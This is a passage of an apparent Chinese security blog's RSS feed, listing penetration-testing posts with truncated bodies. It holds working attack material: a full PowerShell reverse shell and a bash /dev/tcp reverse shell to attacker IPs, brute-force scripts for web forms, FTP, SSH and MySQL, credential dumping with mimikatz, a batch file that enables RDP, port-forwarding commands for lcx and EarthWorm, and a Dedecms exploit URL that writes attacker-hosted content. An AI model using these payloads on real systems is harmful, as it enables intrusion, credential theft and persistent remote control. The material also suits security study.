      <description>0x00 接收变量的php脚本如下 //代码仅供测试 &amp;lt;?php $name = @$_POST[&#39;uname&#39;]; $pass = @$_POST[&#39;upass&#39;]; if (empty($name) or empty($pass)){ header(&amp;quot;location:http://127.0.0.1:921/test/test/index.html&amp;quot;); exit(); } else { if ($name === &#39;admin&#39; and $pass === &#39;123456&#39;){ header(&amp;quot;location:http://127.0.0.1:921/test/test/sucess.html&amp;quot;); } else { header(&amp;quot;location:http://127.0.0.1:921/test/test/error.html&amp;quot;); exit(); } } ?&amp;gt;  0x01 爆破表单的python脚本如下 #!/usr/bin/env python # -*- coding: utf-8 -*- import hashlib import requests from Queue import Queue import threading from optparse import OptionParser from time import sleep lock = threading.Lock() queue = Queue() result = [] class FormBlast(threading.</description>
    </item>
    
    <item>
      <title>Python实现多线程弱口令爆破</title>
      <link>http://wyb0.com/posts/python-multi-threaded-weak-password-blasting/</link>
      <pubDate>Fri, 26 Aug 2016 17:53:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-multi-threaded-weak-password-blasting/</guid>
      <description>0x00 脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- &#39;this script can bruter ftp/ssh/mysql&#39; __author__ = &#39;reber&#39; import Queue import threading import time import logging import socket from optparse import OptionParser import paramiko from ftplib import FTP import MySQLdb #################公有类################# class CommonFun(object): &amp;quot;&amp;quot;&amp;quot;docstring for CommonFun&amp;quot;&amp;quot;&amp;quot; def __init__(self): super(CommonFun, self).__init__() def set_log(self,lname): logger = logging.getLogger(lname) logger.setLevel(logging.DEBUG) ch = logging.StreamHandler() ch.setLevel(logging.DEBUG) formatter = logging.Formatter(&#39;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#39;) ch.setFormatter(formatter) logger.</description>
    </item>
    
    <item>
      <title>Metasploit的简单使用</title>
      <link>http://wyb0.com/posts/metasploit-usage/</link>
      <pubDate>Tue, 23 Aug 2016 10:05:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/metasploit-usage/</guid>
      <description>0x00 启动 0x01 Metasploit的工作平台 在msf里的工作平台可以保存历史的一些操作信息 0x02 使用db_nmap扫描主机 扫描后的结果会保留在工作平台中，可以用hosts和services进行查看： 0x03 使用msf的模块进行弱口令爆破 注：这里针对ftp服务进行弱口令测试 使用vulns可以查看结果：msf auxiliary(ftp_login) &amp;gt; vulns</description>
    </item>
    
    <item>
      <title>Ubuntu下安装Metasploit</title>
      <link>http://wyb0.com/posts/ubuntu-install-metasploit/</link>
      <pubDate>Thu, 18 Aug 2016 10:38:41 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ubuntu-install-metasploit/</guid>
      <description> 0x00 安装Metasploit  下载msfinstall脚本
$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall  修改文件权限
$ chmod 755 msfinstall  安装(可能时间较久)
$ ./msfinstall  更新exp
$ msfupdate   0x01 连接数据库  首先启动postgresql数据库
$ /etc/init.d/postgresql start #service postgresql start也可以  初始化MSF数据库(关键步骤)
$ msfdb init  运行msfconsole
$ msfconsole  在msf中查看数据库连接状态
msf &amp;gt; db_status #若出现错误：Module database cache not built yet, using slow search #则重新构建缓存，缓存构建通常需要5-10分钟左右。 #构建完成后，退出Metasploit控制台，然后重新进入即可使用数据库缓存进行搜索模块 msf &amp;gt; db_rebuild_cache   </description>
    </item>
    
    <item>
      <title>BurpSuite抓手机包</title>
      <link>http://wyb0.com/posts/burpsuite-intercept-packets-of-phone/</link>
      <pubDate>Sat, 13 Aug 2016 23:53:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/burpsuite-intercept-packets-of-phone/</guid>
      <description> 0x00 环境设置 Windows Phone手机和电脑处于同一无线环境下： 0x01 BurpSuite设置 0x02 抓HTTP包 0x03 抓HTTPS包  挂burpsuite的代理下载证书  把证书上传到你自己的服务器上(也可以本地搭建网站)，然后手机访问证书
安卓手机修改证书后缀为crt，证书可以放在网站上，也可以直接拖到手机上，然后安装  抓https数据包   </description>
    </item>
    
    <item>
      <title>Web常见漏洞脑图</title>
      <link>http://wyb0.com/posts/mind-map-of-web-common-vulnerabilities/</link>
      <pubDate>Thu, 11 Aug 2016 21:17:21 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/mind-map-of-web-common-vulnerabilities/</guid>
      <description> Web常见漏洞 </description>
    </item>
    
    <item>
      <title>Linux下系统漏洞提权</title>
      <link>http://wyb0.com/posts/linux-use-system-vulnerabilities-elevate-privileges/</link>
      <pubDate>Tue, 09 Aug 2016 19:23:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-use-system-vulnerabilities-elevate-privileges/</guid>
      <description>0x00 Linux下的提权 Linux下一般都是系统漏洞提权，分为以下几个步骤：
1. 获取系统版本号 2. 根据系统版本号找对应exp 3. 反弹shell 4. 尝试利用  0x01 提权  获取系统版本号  获取发行版本  cat /etc/*-release cat /etc/issue cat /etc/lsb-release cat /etc/redhat-release  获取内核版本  cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz   根据系统版本号找对应exp  http://www.exploit-db.com http://1337day.com http://www.securiteam.com http://www.securityfocus.com http://www.exploitsearch.net http://metasploit.com/modules http://securityreason.com http://seclists.org/fulldisclosure http://www.google.com  反弹shell  本地：nc -l -p 8888 目标机器：/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.</description>
    </item>
    
    <item>
      <title>端口转发</title>
      <link>http://wyb0.com/posts/port-forwarding/</link>
      <pubDate>Mon, 08 Aug 2016 19:33:45 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/port-forwarding/</guid>
      <description> 0x00 应用场景  内网IP的80端口通过端口映射到了外网IP的80端口上 内网的Web服务器通过外网IP反向代理(如Nginx) 也就是说Web服务器在内网中  0x01 判断Web是否为内网  向ping域名，查看IP是外网 用webshell查看ip却是内网IP  0x02 端口转发工具  lcx htran EarthWorm netsh reGeorg meterpreter porfwd  0x03 lcx端口转发  Hacker：lcx.exe -listen 500 8888 Victim：lcx.exe -slave hacker_ip 500 victim_ip 3389 Hacker：cmd mstsc hacker_ip:500  0x04 EarchWorm端口转发  Hacker：./ew -s rcsocks -l 1080 -e 8888 Victim：./ew -s rssocks -d hacker_ip -e 8888 1. 启动EarchWorm 2. hacker主机使用代理 3. hacker内网主机连接目标的内网主机   0x05 Meterpreter  Hacker端生成payload  msf监听端口  目标主机运行exp  msf收到新会话  msf执行命令   </description>
    </item>
    
    <item>
      <title>导出主机密码与开启3389</title>
      <link>http://wyb0.com/posts/export-host-password-and-open-3389/</link>
      <pubDate>Mon, 08 Aug 2016 08:28:27 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/export-host-password-and-open-3389/</guid>
      <description>0x00 导出主机密码hash  条件
 administrator以上权限  工具
 wce gethash hashdump  hash解密网站
 http://www.objectif-securite.ch/ophcrack.php  上传工具得到hash   0x01 导出主机密码  条件
 administrator以上权限 当前管理员没有注销登陆(可以通过query user命令看出)  工具
 mimikatz getpass  上传工具得到密码   0x02 开启3389  直接使用注册表  写一个批处理也行
# 3389.bat内容如下： echo Windows Registry Editor Version 5.00&amp;gt;&amp;gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&amp;gt;&amp;gt;3389.reg echo &amp;quot;fDenyTSConnections&amp;quot;=dword:00000000&amp;gt;&amp;gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&amp;gt;&amp;gt;3389.reg echo &amp;quot;PortNumber&amp;quot;=dword:00000d3d&amp;gt;&amp;gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&amp;gt;&amp;gt;3389.reg echo &amp;quot;PortNumber&amp;quot;=dword:00000d3d&amp;gt;&amp;gt;3389.reg regedit /s 3389.reg del 3389.</description>
    </item>
    
    <item>
      <title>Windows下第三方服务提权</title>
      <link>http://wyb0.com/posts/windows-use-third-party-server-elevate-privileges/</link>
      <pubDate>Sun, 07 Aug 2016 23:38:58 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/windows-use-third-party-server-elevate-privileges/</guid>
      <description> 0x00 MSSQL提权 MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权
提权条件：数据库账号是DBA权限
 关于xp_cmdshell
 得到数据库连接信息，连接数据库后执行EXEC xp_cmdshell &#39;net user&#39;; 有sql注入时也可以直接在url上使用xp_cmdshell，因为mssql可以多语句执行，例如?id=1;EXEC xp_cmdshell &#39;net user&#39;;--  连接数据库  执行系统命令  添加用户  远程连接   0x01 MySQL提权 环境：web应用服务器权限较低
提权条件：MySQL是system权限
 关于UDF  MySQL提权可以用UDF和Mof。UDF就是User defined Function，即用户定义函数，可以通过创建存储方法来定义函数，从而调用系统命令。
 UDF提权过程
 导入udf.dll到服务器指定目录
 MySQL版本小于5.1的udf.dll要导入到c:\windows\目录下
 MySQL版本大于等于5.1的udf.dll要导入到plugin_dir目录，plugin_dir在MySQL安装目录下的lib/plugin目录下(MySQL安装目录可以用select @@basedir得到)，默认不存在这个目录，我们要自己创建  使用SQL语句创建功能函数
CREATE FUNCTION shell RETURNS STRING SONAME &amp;lsquo;udf.dll&amp;rsquo;; 执行MySQL语句调用新创建的函数
select shell(&amp;lsquo;cmd&amp;rsquo;,&amp;lsquo;whoami&amp;rsquo;); 删除创建的函数
drop function shell;  查看基本信息  上传udf提权  添加用户  远程连接   </description>
    </item>
    
    <item>
      <title>Windows下系统漏洞提权</title>
      <link>http://wyb0.com/posts/windows-use-system-vulnerabilities-elevate-privileges/</link>
      <pubDate>Sun, 07 Aug 2016 21:31:35 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/windows-use-system-vulnerabilities-elevate-privileges/</guid>
      <description> 提权是在已经getshell但是权限不大的前提下做的
0x00 查看基本信息 0x01 使用cmd执行命令  尝试使用cmd执行命令  找可写目录  尝试上传cmd.exe  写一个aspx马  上传cmd.exe  再次尝试使用cmd执行命令   0x02 权限提升  查看未安装补丁
systeminfo&amp;gt;a.txt&amp;amp;(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644) do @type a.txt|@find /i &amp;quot;%i&amp;quot;||@echo %i Not Installed!)&amp;amp;del /f /q /a a.txt   上传exp提权   0x03 添加用户  添加远程连接用户  0x04 使用3389远程连接 </description>
    </item>
    
    <item>
      <title>反弹shell小结</title>
      <link>http://wyb0.com/posts/reverse-shell/</link>
      <pubDate>Sat, 06 Aug 2016 08:36:53 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/reverse-shell/</guid>
      <description>当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令
0x00 PowerShell #更换ip和端口即可 本地：nc -lv 8888 目标：powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true) {$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a=&#39;10.10.10.10&#39;;$p=&#39;8888&#39;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=&#39;cmd.exe&#39;;$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());while($os.Peek() -ne -1){$o += $e.</description>
    </item>
    
    <item>
      <title>Dedecms远程写文件漏洞</title>
      <link>http://wyb0.com/posts/dedecms-remote-write-file-vulnerability/</link>
      <pubDate>Fri, 05 Aug 2016 23:29:20 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/dedecms-remote-write-file-vulnerability/</guid>
      <description> 0x00 关于漏洞 Dedecms在20150618之前的版本都存在远程写文件漏洞，主要起因是Apache的解析漏洞  0x01 利用条件 dedecms版本为20150618之前的 安装目录install下的index.php.bak文件未被删除  0x02 实例  查看cms版本  清空文件
http://www.xxxx.com/install/index.php.bak?step=11&amp;amp;insLockfile=a &amp;amp;s_lang=a&amp;amp;install_demo_name=../data/admin/config_update.php 访问上面的链接会使服务器到http://updatenew.dedecms.com/base-v57/dedecms/ demodata.a.txt中读取内容写入到config_update.php，但demodata.a.txt为空， 所以就清空了config_update.php   在自己的服务器上创建文件  写入文件
访问http://www.xxxx.com/install/index.php.bak?step=11&amp;amp;insLockfile=a &amp;amp;s_lang=a&amp;amp;install_demo_name=info.php&amp;amp;updateHost=http://123.123.123.123/ 将自己的网站的dedecoms/demodata.a.txt写入到目标站点的install/下的info.php中   访问生成的文件   </description>
    </item>
    
    <item>
      <title>Redis未授权访问漏洞</title>
      <link>http://wyb0.com/posts/redis-unauthorized-access/</link>
      <pubDate>Thu, 04 Aug 2016 15:52:26 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/redis-unauthorized-access/</guid>
      <description> 0x00 Redis的未授权访问 若Redis服务器对公网开放，且未启用认证，则攻击者可以未授权访问服务器。 若Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，通过SSH登录受害服务器。
0x01 向Redis服务器上传SSH公钥 0x02 通过计划任务反弹shell </description>
    </item>
    
    <item>
      <title>Tomcat部署War包getshell</title>
      <link>http://wyb0.com/posts/tomcat-deploy-war-package-to-getshell/</link>
      <pubDate>Tue, 02 Aug 2016 22:30:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/tomcat-deploy-war-package-to-getshell/</guid>
      <description>0x00 关于War包 War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码, 以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布 则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat 服务器启动时,War包也会随之被解压后自动部署。  0x01 上传War包GetShell  找到后台猜密码然后登录  上传War包
先将jsp大马压缩为zip，再将zip后缀改名为war，然后上传war包   0x02漏洞防御  后台使用强密码 删除Tomcat下的manager文件夹  0x03 附爆破弱口令代码 #!/usr/bin/env python #-*- coding:utf-8 -*- import requests import json import base64 import sys import Queue import threading &amp;quot;&amp;quot;&amp;quot; 简单爆破后台登陆密码 Usage: python tomcat.py username.txt password.txt urlfile.txt username.txt为用户名字典 password.txt为密码字典 urlfile.txt为后台url列表 &amp;quot;&amp;quot;&amp;quot; def get_username(userfile): username = [] with open(userfile, &#39;r&#39;) as f: lines = f.readlines() for line in lines: username.</description>
    </item>
    
    <item>
      <title>BurpSuite的Intruder模块</title>
      <link>http://wyb0.com/posts/burpsuite-intruder-module/</link>
      <pubDate>Mon, 01 Aug 2016 09:17:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/burpsuite-intruder-module/</guid>
      <description> 0x00 示例一 0x01 示例二 </description>
    </item>
    
    <item>
      <title>逻辑漏洞</title>
      <link>http://wyb0.com/posts/logical-loophole/</link>
      <pubDate>Sun, 31 Jul 2016 18:43:49 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/logical-loophole/</guid>
      <description>0x00 逻辑漏洞 逻辑漏洞是一种业务逻辑上的设计缺陷，业务流存在问题。 这里说一下密码找回漏洞、多线程条件竞争漏洞和支付漏洞。
0x01 密码找回漏洞  测试流程
 先尝试正确的密码找回流程，记录不同找回方式的所有数据包 分析数据包，找到有效数据部分 推测数据构造方法 构造数据包验证猜测  分类
 邮箱找回
一般是点击邮件中的链接后会转跳到修改密码的页面，需要分析链接的token构造，可以考虑是时间戳md5、用户名或邮箱和随机字符串md5等，一般是类似如下链接： http://domain/findpwd.php?u=xiaoming&amp;amp;token=MTIzQHFxLmNvbQ== http://domain/findpwd.php?id=374&amp;amp;token=2ad64bf14c714dbce88c7993663da7da 当构造相应链接时就可以重置任意用户的密码  手机短信找回
短信找回一般就是4位或6位验证码，暴力猜测吧  找回逻辑错误
若恶意用户A用15123333333找回密码，此时收到验证码但不使用 此时恶意用户A再用受害者B的手机号找回密码 用户A在B的验证表单填入自己收到的验证码，发送 此时跳转的修改密码页面修改的就是用户B的密码  直接修改密码
在修改密码时跳过选择找回方式，直接访问修改密码的页面进行修改  本地验证
随意输入一个验证码，开Burp抓包，forward，抓返回包，返回包里可能有一个flag字段， 若flag的值为1则跳转到修改密码页面，所以只要修改返回包即可  服务端将验证码返回给浏览器
在点击获取验证码时，服务器会将验证码发送给浏览器，抓包即可  验证码直接出现在url中
当点击获取验证码时发出的请求链接中直接有code  密保问题找回
回答密保问题，有时一些答案就在html源码里    0x02 多线程条件竞争漏洞 多线程条件竞争漏洞是一种服务端的漏洞，服务端是并发处理用户请求的，若并发处理不当或相关操作逻辑设计有缺陷时就会产生一些安全问题。
 文件上传  服务端可以sudo apt-get install inotify-tools安装监听文件的软件，执行inotifywait -m /var/www/html/admin监听admin文件夹中文件的变化
//uploads.php代码如下，仅供测试： &amp;lt;meta charset=&#39;utf-8&#39;&amp;gt; &amp;lt;?php $allowtype = array(&amp;quot;gif&amp;quot;,&amp;quot;png&amp;quot;,&amp;quot;jpg&amp;quot;); $size = 10000000; $path = &amp;quot;.</description>
    </item>
    
    <item>
      <title>敏感信息泄露</title>
      <link>http://wyb0.com/posts/sensitive-information-leakage/</link>
      <pubDate>Thu, 28 Jul 2016 22:42:58 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/sensitive-information-leakage/</guid>
      <description>0x00 软件敏感信息 * 操作系统版本 可用namp扫描得知 * 中间件的类型、版本 http返回头 404报错页面 使用工具(如whatweb) * Web程序(cms类型及版本、敏感文件) 可用whatweb、cms_identify  0x01 Web敏感信息 * phpinfo()信息泄露 http://[ip]/test.php和http://[ip]/phpinfo.php * 测试页面泄露在外网 test.cgi、phpinfo.php、info.php等 * 编辑器备份文件泄露在外网 http://[ip]/.test.php.swp http://[ip]/test.php.bak http://[ip]/test.jsp.old http://[ip]/cgi~ 常见编辑器备份后缀 * 版本管理工具(如git)文件信息泄露 http://[ip]/.git/config http://[ip]/CVS/Entriesp http://[ip]/.svn/entriesp * HTTP认证泄露漏洞 http://[ip]/basic/index.php Web目录开启了HTTP Basic认证，但未限制IP，导致可暴力破解账号、密码 * 管理后台地址泄露 http://[ip]/login.php http://[ip]/admin.php http://[ip]/manager.php http://[ip]/admin_login.php * 泄露员工邮箱、分机号码 泄露邮箱及分机号码可被社工，也可生成字典 * 错误页面暴漏信息 mysql错误、php错误、暴漏cms版本等 * 探针文件 * robots.txt * phpMyAdmin * 网站源码备份文件(www.rar/sitename.tar.gz/web/zip等) * 其他  0x02 网络信息泄露 * DNS域传送漏洞 * 运维监控系统弱口令、网络拓扑泄露 zabbix弱口令、zabbix sql注入等  0x03 第三方软件应用 * github上源码、数据库、邮箱密码泄露 搜类似：smtp 163 password关键字 * 百度网盘被员工不小心上传敏感文件 * QQ群被员工不小心上传敏感文件  0x04 敏感信息搜集工具 https://github.</description>
    </item>
    
    <item>
      <title>任意文件查看与下载漏洞</title>
      <link>http://wyb0.com/posts/any-file-view-and-download-vulnerability/</link>
      <pubDate>Wed, 27 Jul 2016 23:25:18 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/any-file-view-and-download-vulnerability/</guid>
      <description>0x00 漏洞介绍 一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞
0x01 利用条件 * 存在读文件的函数 * 读取文件的路径用户可控且未校验或校验不严 * 输出了文件内容  0x02 漏洞危害 下载服务器任意文件，如脚本代码、服务及系统配置文件等 可用得到的代码进一步代码审计，得到更多可利用漏洞  0x03 任意文件读取 代码形式可如下几种：
&amp;lt;?php $filename = &amp;quot;test.txt&amp;quot;; readfile($filename); ?&amp;gt; &amp;lt;?php $filename = &amp;quot;test.txt&amp;quot;; $fp = fopen($filename,&amp;quot;r&amp;quot;) or die(&amp;quot;Unable to open file!&amp;quot;); $data = fread($fp,filesize($filename)); fclose($fp); echo &amp;quot;&amp;lt;pre&amp;gt;&amp;quot;; print_r(htmlspecialchars($data)); echo &amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;; ?&amp;gt; &amp;lt;?php $filename = &amp;quot;test.txt&amp;quot;; $data = file_get_contents($filename); echo &amp;quot;&amp;lt;pre&amp;gt;&amp;quot;; print_r(htmlspecialchars($data)); echo &amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;; ?&amp;gt;  0x04 任意文件下载 直接下载：
&amp;lt;a href=&amp;quot;http://www.xx.com/a.zip&amp;quot;&amp;gt;Download&amp;lt;/a&amp;gt;  用header()下载：</description>
    </item>
    
    <item>
      <title>文件包含漏洞</title>
      <link>http://wyb0.com/posts/file-include-vulnerabilities/</link>
      <pubDate>Tue, 26 Jul 2016 09:24:22 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/file-include-vulnerabilities/</guid>
      <description>0x00 文件包含 程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。
程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。
几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多,而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。
在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。
0x01 常见文件包含函数 include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行 require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本 include_once()和require_once()：若文件中代码已被包含则不会再次包含  0x02 利用条件  程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件 用户能够控制该动态变量  注：PHP中只要文件内容符合PHP语法规范，包含时不管扩展名是什么都会被PHP解析， 若文件内容不符合PHP语法规范则会暴漏其源码。包含不存在的文件则可能暴露路径  0x03 漏洞危害  执行任意代码 读取文件源码或敏感信息 包含恶意文件控制网站 甚至控制服务器  0x04 漏洞分类  本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码  读敏感文件，读PHP文件 包含日志文件GetShell 上传图片马，然后包含从而GetShell 包含/proc/self/envion文件GetShell 包含data:或php://input等伪协议 若有phpinfo则可以包含临时文件  远程文件包含：可以直接执行任意代码  要保证php.ini中allow_url_fopen和allow_url_include要为On   0x05 漏洞挖掘  上AWVS或者自己写代码测试
 0x06 本地包含GetShell  示例一  &amp;lt;?php if (@$_GET[&#39;page&#39;]) { include($_GET[&#39;page&#39;]); } else { include &amp;quot;show.php&amp;quot;; } ?</description>
    </item>
    
    <item>
      <title>PHP反序列化漏洞</title>
      <link>http://wyb0.com/posts/php-deserialization-vulnerabilities/</link>
      <pubDate>Mon, 25 Jul 2016 23:32:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/php-deserialization-vulnerabilities/</guid>
      <description>0x00 关于反序列化漏洞 序列化：使用函数serialize()可将实例序列化为字符串
反序列化：使用函数unserialize()可将序列化的字符串还原
若服务端有如下代码：
&amp;lt;?php class foo{ public $file = &amp;quot;test.txt&amp;quot;; public $data = &amp;quot;123456&amp;quot;; function __destruct(){ file_put_contents($this-&amp;gt;file,$this-&amp;gt;data); } } $d = $_REQUEST[&#39;str&#39;]; var_dump($d); echo &amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; $tc = unserialize(base64_decode($d)); var_dump($tc); ?&amp;gt;  客户端可构造如下代码生成序列化后的字符串提交给服务端，
服务端就会生成文件xx.php，内容为&amp;lt;?php phpinfo(); ?&amp;gt;：
&amp;lt;?php class foo { public $ﬁle = &amp;quot;test.txt&amp;quot;; public $data = &amp;quot;123456&amp;quot;; function __destruct() { ﬁle_put_contents($this-&amp;gt;ﬁle, $this-&amp;gt;data); } } $f = new foo(); $f-&amp;gt;ﬁle = &amp;quot;xx.php&amp;quot;; $f-&amp;gt;data = &amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot;; echo base64_encode(serialize($f)); ?</description>
    </item>
    
    <item>
      <title>代码执行漏洞(一)</title>
      <link>http://wyb0.com/posts/code-execution-vulnerabilities/</link>
      <pubDate>Mon, 25 Jul 2016 22:32:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/code-execution-vulnerabilities/</guid>
      <description>0x00 代码执行 当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。
0x01 相关函数 PHP：eval assert Python：exec asp：&amp;lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&amp;gt; Java：没有类似函数，但采用的反射机制和各种基于反射机制的表达式引擎(OGNL、SpEL、MVEL等)有类似功能  0x02 phpcms中的string2array函数 这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组
array( //这个是字符串形式的数组，它并不是数组，而是字符串 &#39;upload_maxsize&#39; =&amp;gt; &#39;2048&#39;, &#39;upload_allowext&#39; =&amp;gt; &#39;jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf&#39;, &#39;watermark_enable&#39; =&amp;gt; &#39;1&#39;, &#39;watermark_minwidth&#39; =&amp;gt; &#39;300&#39;, &#39;watermark_minheight&#39; =&amp;gt; &#39;300&#39;, &#39;watermark_img&#39; =&amp;gt; &#39;/statics/img/water/mark.png&#39;, &#39;watermark_pct&#39; =&amp;gt; &#39;85&#39;, &#39;watermark_quality&#39; =&amp;gt; &#39;80&#39;, &#39;watermark_pos&#39; =&amp;gt; &#39;9&#39;, )  function string2array($data) { //这个函数可以将字符串$data转化为数组 if($data == &#39;&#39;) return array(); @eval(&amp;quot;\$array = $data;&amp;quot;); return $array; }  0x03 漏洞危害  执行代码 让网站写shell 甚至控制服务器  0x04 漏洞分类(也是利用点) 执行代码的函数：eval、assert callback函数：preg_replace + /e模式 反序列化：unserialize()(反序列化函数)  0x05 漏洞挖掘 框架找漏洞，如ThinkPHP： inurl:index.</description>
    </item>
    
    <item>
      <title>命令执行漏洞</title>
      <link>http://wyb0.com/posts/command-execution-vulnerabilities/</link>
      <pubDate>Sun, 24 Jul 2016 14:32:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/command-execution-vulnerabilities/</guid>
      <description>0x00 命令执行 应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、 passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令 拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。  0x01 利用条件  应用调用执行系统命令的函数 将用户输入作为系统命令的参数拼接到了命令行中 没有对用户输入进行过滤或过滤不严  0x02 漏洞分类  代码层过滤不严
商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：
system(&amp;ldquo;/bin/program --arg $arg&amp;rdquo;); 系统的漏洞造成命令执行
bash破壳漏洞(CVE-2014-6271)
执行env x=&#39;() { :;}; echo vulnerable&#39; bash -c &amp;quot;echo this is a test&amp;quot;后
若输出vulnerable则证明存在漏洞 调用的第三方组件存在代码执行漏洞
如WordPress中用来处理图片的ImageMagick组件
JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)
ThinkPHP命令执行  0x03 漏洞危害  继承Web服务程序的权限去执行系统命令或读写文件 反弹shell 控制整个网站甚至控制服务器 进一步内网渗透 等等  0x04 漏洞挖掘 可以google hacking
尝试：filetype:action或filetype:do来找struts2
0x05 漏洞可能代码(以system为例) 1. system(&amp;quot;$arg&amp;quot;); //直接输入即可 2. system(&amp;quot;/bin/prog $arg&amp;quot;); //直接输入;ls 3. system(&amp;quot;/bin/prog -p $arg&amp;quot;); //和2一样 4.</description>
    </item>
    
    <item>
      <title>文件上传之文本编辑器上传漏洞</title>
      <link>http://wyb0.com/posts/file-upload-editor-upload-vulnerability/</link>
      <pubDate>Thu, 21 Jul 2016 15:11:29 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/file-upload-editor-upload-vulnerability/</guid>
      <description> 0x00 文本编辑器 常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。
0x01 FCKeditor 下面以FCKeditor(现名为CKEditor)为例：
